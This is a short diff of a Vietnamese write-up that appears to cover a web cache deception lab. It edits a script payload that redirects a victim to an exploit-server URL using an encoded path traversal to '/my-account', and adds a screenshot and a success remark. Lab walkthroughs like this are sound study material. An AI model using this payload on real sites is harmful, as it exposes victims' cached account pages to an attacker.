@@ -24,6 +24,9 @@ Máy chủ chuẩn hóa cả hai URL (/abc/..%2fmy-account và /resources/..%2fm
 Đó, thì tiến hành tạo payload và gửi cho victim thôi.
 
 ```
-<script>document.location="https://exploit-0ac300f704e9d71b8190333601980025.exploit-server.net/resources/..%2fmy-account?wcd"</script>
+<script>document.location="https://exploit-0ac300f704e9d71b8190333601980025.exploit-server.net/resources/..%2fmy-account"</script>
 ```
 
+![image](https://github.com/user-attachments/assets/8f2a5718-5eea-47a1-b7af-344c6cd46612)
+
+Thành công
